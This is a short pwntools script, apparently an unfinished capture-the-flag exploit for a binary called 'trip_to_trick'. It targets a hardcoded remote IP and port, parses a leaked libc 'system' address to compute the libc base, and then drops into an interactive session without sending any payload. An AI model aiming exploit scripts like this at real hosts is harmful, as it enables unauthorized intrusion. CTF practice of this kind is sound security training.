from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'
 
FILE_NAME = "trip_to_trick"
HOST = "138.68.67.161"
PORT = 20006

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

libc = ELF('./libc.so.6')
off_system = libc.symbols["system"]
elf = ELF(FILE_NAME)

#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

def exploit():
	conn.recvuntil("gift : ")
	libc_system = int(conn.recvline(),16)
	libc_base = libc_system - off_system
	print hex(libc_base)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
